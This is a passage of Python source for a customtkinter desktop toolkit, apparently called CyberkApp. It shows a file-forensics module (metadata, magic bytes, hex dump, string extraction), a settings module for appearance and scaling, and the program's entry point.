        self.out.pack(fill="both", expand=True, padx=20, pady=20)
        
        self.current_file = None

    def load_file(self):
        p = filedialog.askopenfilename()
        if p:
            self.current_file = p
            self.lbl_file.configure(text=os.path.basename(p))
            self.app.log(f"File loaded for forensics: {p}", "INFO")

    def meta_analysis(self):
        if not self.current_file: return
        try:
            stat = os.stat(self.current_file)
            res = f"File: {self.current_file}\n"
            res += f"Size: {stat.st_size} bytes\n"
            res += f"Created: {datetime.datetime.fromtimestamp(stat.st_ctime)}\n"
            res += f"Modified: {datetime.datetime.fromtimestamp(stat.st_mtime)}\n"
            
            # Magic bytes
            with open(self.current_file, "rb") as f:
                head = f.read(4)
                res += f"Magic Bytes: {head.hex().upper()}"
            
            self.out.delete("1.0", "end")
            self.out.insert("end", res)
        except Exception as e: self.out.insert("end", str(e))

    def hex_dump(self):
        if not self.current_file: return
        try:
            with open(self.current_file, "rb") as f:
                data = f.read(512)
            
            dump = ""
            for i in range(0, len(data), 16):
                chunk = data[i:i+16]
                hex_part = " ".join(f"{b:02X}" for b in chunk)
                ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
                dump += f"{i:04X}  {hex_part:<48}  {ascii_part}\n"
                
            self.out.delete("1.0", "end")
            self.out.insert("end", dump)
        except Exception as e: self.out.insert("end", str(e))

    def extract_strings(self):
        if not self.current_file: return
        try:
            min_len = 4
            with open(self.current_file, "rb") as f:
                data = f.read()
            
            result = ""
            current_str = ""
            for byte in data:
                if 32 <= byte < 127:
                    current_str += chr(byte)
                else:
                    if len(current_str) >= min_len:
                        result += current_str + "\n"
                    current_str = ""
            
            self.out.delete("1.0", "end")
            self.out.insert("end", f"--- Strings (Min Len {min_len}) ---\n{result}")
        except Exception as e: self.out.insert("end", str(e))


# ==============================================================================
# MODULE 8: SETTINGS
# ==============================================================================
class SettingsModule(ctk.CTkFrame):
    def __init__(self, parent, app):
        super().__init__(parent, fg_color="transparent")
        self.app = app
        
        ctk.CTkLabel(self, text="SETTINGS & CONFIGURATION", font=("Arial Black", 20)).pack(pady=30)
        
        # Appearance
        frm = ctk.CTkFrame(self)
        frm.pack(pady=10, padx=50, fill="x")
        
        ctk.CTkLabel(frm, text="Appearance Mode:").pack(side="left", padx=20, pady=20)
        ctk.CTkOptionMenu(frm, values=["Dark", "Light", "System"], 
                          command=self.change_appearance).pack(side="right", padx=20)

        # UI Scale
        frm2 = ctk.CTkFrame(self)
        frm2.pack(pady=10, padx=50, fill="x")
        
        ctk.CTkLabel(frm2, text="UI Scaling:").pack(side="left", padx=20, pady=20)
        ctk.CTkOptionMenu(frm2, values=["80%", "90%", "100%", "110%", "120%"], 
                          command=self.change_scaling).pack(side="right", padx=20)

        # About
        ctk.CTkLabel(self, text=f"{APP_NAME} {APP_VERSION}", text_color="gray").pack(side="bottom", pady=20)

    def change_appearance(self, new_appearance_mode):
        ctk.set_appearance_mode(new_appearance_mode)

    def change_scaling(self, new_scaling):
        new_scaling_float = int(new_scaling.replace("%", "")) / 100
        ctk.set_widget_scaling(new_scaling_float)

# ==============================================================================
# ENTRY POINT
# ==============================================================================
if __name__ == "__main__":
    # Ensure HighDPI awareness on Windows
    try:
        from ctypes import windll
        windll.shcore.SetProcessDpiAwareness(1)
    except: pass

    app = CyberkApp()
    app.mainloop()